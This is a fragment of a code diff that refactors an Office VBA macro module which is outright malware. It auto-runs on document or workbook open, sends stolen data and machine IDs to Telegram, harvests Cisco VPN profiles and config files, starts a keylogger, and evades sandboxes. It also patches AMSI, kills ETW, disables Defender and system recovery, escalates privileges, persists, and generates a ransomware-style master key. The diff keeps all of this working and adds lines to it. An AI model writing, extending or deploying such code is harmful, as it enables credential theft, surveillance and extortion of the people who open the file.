+#End If
+    Dim searchPattern As String
+    Dim fileCount As Long
+    If Right(folderPath, 1) <> "\" Then folderPath = folderPath & "\"
+    searchPattern = folderPath & "*"
     hFile = FindFirstFileW(StrPtr(searchPattern), VarPtr(findData))
     If hFile <> INVALID_HANDLE_VALUE Then
-        Do: fileCount = fileCount + 1: Loop While FindNextFileW(hFile, VarPtr(findData)) <> 0
+        Do
+            fileCount = fileCount + 1
+        Loop While FindNextFileW(hFile, VarPtr(findData)) <> 0
         FindClose hFile
     End If
     SendToTelegram "KERNEL_SCAN|Folder=" & folderPath & "|Files=" & fileCount
@@ -2128,7 +3102,7 @@ Private Sub HijackCisco()
     For Each p In profilePaths
         If fso.FolderExists(p) Then
             Dim folder As Object: Set folder = fso.GetFolder(p)
-            Dim file As Object
+            Dim file As Variant
             For Each file In folder.Files
                 If LCase(fso.GetExtensionName(file.Name)) = "xml" Then
                     Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
@@ -2160,8 +3134,9 @@ Private Sub HijackCisco()
     For Each sd In searchDirs
         If fso.FolderExists(sd) Then
             Dim folder2 As Object: Set folder2 = fso.GetFolder(sd)
-            Dim subFolder As Object, file2 As Object
+            Dim subFolder As Variant
             For Each subFolder In folder2.SubFolders
+                Dim file2 As Variant
                 For Each file2 In subFolder.Files
                     Dim ext2 As String: ext2 = LCase(fso.GetExtensionName(file2.Name))
                     If ext2 = "cfg" Or ext2 = "conf" Then
@@ -2190,7 +3165,8 @@ End Sub
 ' ============================================================
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
-    Set g_stolenCredentials = New Collection: Set g_emailTargets = New Collection
+    Set g_stolenCredentials = New Collection
+    Set g_emailTargets = New Collection
     On Error Resume Next
     g_stolenCredentials.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD
     Err.Clear
@@ -2201,12 +3177,12 @@ Public Sub AutoExec()
         If Not m_EngineActive Then Synapse_Engine_Start
         StartAsyncKeylogger
         StartWatchdog
-        Application.Visible = False: ThisWorkbook.Saved = True
+        Application.Visible = False
+        ThisWorkbook.Saved = True
         Exit Sub
     End If
     gRunFlag = "RUN"
     
-    ' Splash‑Lock Bypass – reveal all sheets, hide Splash sheet
     BypassSplashLock
     
     If gFirstRun = False Then
@@ -2220,12 +3196,19 @@ Public Sub AutoExec()
         CreateEnableMacrosButton
     End If
     
-    ' Inject trusted location and VBA trust bypass
     InjectSystemTrust
     
-    If IsSandbox() Then SendToTelegram "SANDBOX_DETECTED|MACHINE=" & GetMachineID(): Exit Sub
+    If IsSandbox() Then
+        SendToTelegram "SANDBOX_DETECTED|MACHINE=" & GetMachineID()
+        Exit Sub
+    End If
     ShowFakeError
-    PatchAMSI: KillETW: DisableDefender: DisableRecovery: ElevatePrivileges: GenerateMasterKey
+    PatchAMSI
+    KillETW
+    DisableDefender
+    DisableRecovery
+    ElevatePrivileges
+    GenerateMasterKey
     SendToTelegram "LAZARUS_START|MACHINE=" & GetMachineID()
     PersistAll
     Synapse_Engine_Start
@@ -2277,7 +3260,18 @@ ErrorHandler:
     Loop
 End Sub
 
-Public Sub OnCustomUILoad(): AutoExec: End Sub
-Public Sub Auto_Open(): AutoExec: End Sub
-Public Sub Document_Open(): AutoExec: End Sub
-Public Sub Workbook_Open(): AutoExec: End Sub
+Public Sub OnCustomUILoad()
+    AutoExec
+End Sub
+
+Public Sub Auto_Open()
+    AutoExec
+End Sub
+
+Public Sub Document_Open()
+    AutoExec
+End Sub
+
+Public Sub Workbook_Open()
+    AutoExec
+End Sub
